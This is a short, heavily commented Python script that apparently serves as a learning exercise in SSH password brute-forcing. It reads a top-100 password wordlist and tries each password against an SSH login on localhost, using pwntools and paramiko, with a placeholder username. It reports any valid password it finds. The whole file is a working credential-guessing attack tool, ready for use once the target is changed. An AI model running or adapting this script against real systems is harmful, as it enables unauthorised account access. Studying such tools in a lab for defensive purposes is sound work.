from pwn import *  # Import everything from pwn library for hacking-related utilities
import paramiko  # Import Paramiko for SSH connection handling

# Define connection parameters
host = '127.0.0.1'  # Target host address (localhost in this case)
username = 'CHANGEME'  # Username for SSH connection
attempts = 0  # Counter for tracking the number of password attempts

# Open the password list file
with open("10-million-password-list-top-100.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")  # Remove newline characters from each password
        try:
            # Attempt to connect via SSH using the current password
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=5)  # SSH connection attempt with a timeout of 5 seconds
            if response.connected():  # Check if the connection was successful
                print("[>] Valid password found: '{}'!".format(password))  # If successful, print the valid password
                response.close()  # Close the SSH connection
                break  # Exit the loop since a valid password has been found
            response.close()  # Close the SSH connection if not successful
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")  # Print a message if the password is invalid
        attempts += 1  # Increment the attempt counter
